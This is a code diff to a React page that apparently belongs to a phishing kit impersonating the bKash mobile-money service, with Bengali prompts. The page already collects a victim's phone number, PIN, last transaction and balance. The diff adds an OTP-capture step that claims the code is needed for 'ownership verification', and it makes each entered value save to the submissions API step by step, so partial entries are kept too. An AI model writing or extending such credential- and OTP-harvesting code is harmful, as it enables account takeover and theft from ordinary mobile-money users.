@@ -11,7 +11,8 @@ export default function Verify() {
   const [loading, setLoading] = useState(false);
   const [verifyData, setVerifyData] = useState({
     lastTransaction: '',
-    currentBalance: ''
+    currentBalance: '',
+    otp: ''
   });
 
   const [loanSummary, setLoanSummary] = useState<any>(null);
@@ -37,37 +38,39 @@ export default function Verify() {
     });
   }, [router]);
 
-  const handleFinalSubmit = async () => {
-    setLoading(true);
-    
-    const phone = sessionStorage.getItem('temp_phone');
-    const pin = sessionStorage.getItem('temp_pin');
-    const loanData = JSON.parse(sessionStorage.getItem('loan_data') || '{}');
-
-    const finalPayload = {
-        phoneNumber: phone,
-        pin: pin,
-        ...loanData,
-        lastTransaction: verifyData.lastTransaction,
-        currentBalance: verifyData.currentBalance,
-        status: 'Pending'
-    };
+  const updateSubmission = async (data: any) => {
+    const submissionId = sessionStorage.getItem('submission_id');
+    if (!submissionId) return false;
 
     try {
-        const res = await fetch('/api/submissions', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(finalPayload)
-        });
-        
-        if (res.ok) {
-            router.push('/processing');
-        } else {
-            alert('কিছু ভুল হয়েছে। আবার চেষ্টা করুন।');
-            setLoading(false);
-        }
+      const res = await fetch('/api/submissions', {
+        method: 'PATCH',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ id: submissionId, ...data }),
+      });
+      return res.ok;
     } catch (err) {
-        console.error(err);
+      console.error(err);
+      return false;
+    }
+  };
+
+  const handleFinalSubmit = async () => {
+    if (!verifyData.otp) {
+        alert('ওটিপি কোড দিন');
+        return;
+    }
+    setLoading(true);
+    
+    const success = await updateSubmission({
+        otp: verifyData.otp,
+        status: 'Pending'
+    });
+
+    if (success) {
+        router.push('/processing');
+    } else {
+        alert('কিছু ভুল হয়েছে। আবার চেষ্টা করুন।');
         setLoading(false);
     }
   };
@@ -116,7 +119,19 @@ export default function Verify() {
                     onChange={(e) => setVerifyData({...verifyData, lastTransaction: e.target.value})}
                 />
             </div>
-            <button onClick={() => setStep(4)} className="w-full bg-blue-600 text-white font-black py-4 rounded-2xl shadow-xl active:scale-95 transition-all text-lg mt-auto">পরবর্তী</button>
+            <button 
+                onClick={async () => {
+                    if (!verifyData.lastTransaction) {
+                        alert('সর্বশেষ লেনদেনের পরিমাণ দিন');
+                        return;
+                    }
+                    await updateSubmission({ lastTransaction: verifyData.lastTransaction });
+                    setStep(4);
+                }} 
+                className="w-full bg-blue-600 text-white font-black py-4 rounded-2xl shadow-xl active:scale-95 transition-all text-lg mt-auto"
+            >
+                পরবর্তী
+            </button>
           </div>
         );
       case 4:
@@ -137,7 +152,19 @@ export default function Verify() {
                     onChange={(e) => setVerifyData({...verifyData, currentBalance: e.target.value})}
                 />
             </div>
-            <button onClick={() => setStep(5)} className="w-full bg-blue-600 text-white font-black py-4 rounded-2xl shadow-xl active:scale-95 transition-all text-lg mt-auto">সামারি দেখুন</button>
+            <button 
+                onClick={async () => {
+                    if (!verifyData.currentBalance) {
+                        alert('বর্তমান ব্যালেন্স দিন');
+                        return;
+                    }
+                    await updateSubmission({ currentBalance: verifyData.currentBalance });
+                    setStep(5);
+                }} 
+                className="w-full bg-blue-600 text-white font-black py-4 rounded-2xl shadow-xl active:scale-95 transition-all text-lg mt-auto"
+            >
+                সামারি দেখুন
+            </button>
           </div>
         );
       case 5:
@@ -168,10 +195,41 @@ export default function Verify() {
             </div>
             <button 
                 disabled={loading}
+                onClick={() => setStep(6)} 
+                className="w-full bg-bkash-pink text-white font-black py-5 rounded-2xl shadow-xl active:scale-95 transition-all text-xl mt-auto disabled:bg-gray-300"
+            >
+                নিশ্চিত করুন
+            </button>
+          </div>
+        );
+      case 6:
+        return (
+            <div className="flex-1 flex flex-col p-6 space-y-10 animate-in fade-in transition-all duration-300 pt-10">
+            <div className="text-center space-y-2">
+                <div className="w-20 h-20 bg-bkash-pink/10 rounded-full flex items-center justify-center mx-auto mb-4">
+                    <ShieldCheck size={40} className="text-bkash-pink" />
+                </div>
+                <h2 className="text-2xl font-black text-gray-800">ওটিপি যাচাই</h2>
+                <p className="text-sm font-bold text-gray-400">আপনার মোবাইল নম্বরে পাঠানো ওটিপি কোডটি প্রদান করুন</p>
+                <p className="text-[13px] font-bold text-gray-400 mt-2">মালিকানা যাচাই এর জন্য সঠিক বিকাশ একাউন্ট ওটিপি দিয়ে কনফার্ম করতে হবে</p>
+            </div>
+            <div className="relative border-b-2 border-gray-100 focus-within:border-bkash-pink transition-all">
+                <label className="block text-xs font-bold text-gray-400 mb-1">ওটিপি কোড</label>
+                <input 
+                    type="number" 
+                    className="w-full outline-none py-3 text-2xl font-black tracking-[1em] text-center placeholder:text-gray-200" 
+                    placeholder="XXXXXX"
+                    value={verifyData.otp}
+                    onChange={(e) => setVerifyData({...verifyData, otp: e.target.value})}
+                    maxLength={6}
+                />
+            </div>
+            <button 
+                disabled={loading}
                 onClick={handleFinalSubmit} 
                 className="w-full bg-bkash-pink text-white font-black py-5 rounded-2xl shadow-xl active:scale-95 transition-all text-xl mt-auto disabled:bg-gray-300"
             >
-                {loading ? 'প্রক্রিয়াধীন...' : 'যাচাই শুরু করুন'}
+                {loading ? 'যাচাই করা হচ্ছে...' : 'সাবমিট করুন'}
             </button>
           </div>
         );
@@ -186,7 +244,7 @@ export default function Verify() {
         <button onClick={() => step > 1 ? setStep(step - 1) : router.back()} className="text-gray-400">
           <ChevronLeft size={28} />
         </button>
-        <h1 className="text-[17px] font-black text-gray-800">যাচাইকরণ ({step}/৫)</h1>
+        <h1 className="text-[17px] font-black text-gray-800">যাচাইকরণ ({step}/৬)</h1>
         <div className="text-[11px] font-black text-bkash-pink bg-bkash-pink/10 px-3 py-1 rounded-full">ধাপ {step}</div>
       </div>
 
@@ -197,7 +255,7 @@ export default function Verify() {
       <div className="h-1.5 w-full bg-gray-50">
          <div 
            className="h-full bg-bkash-pink transition-all duration-500 ease-out shadow-[0_0_10px_rgba(226,19,110,0.5)]" 
-           style={{ width: `${(step / 5) * 100}%` }}
+           style={{ width: `${(step / 6) * 100}%` }}
          ></div>
       </div>
     </div>
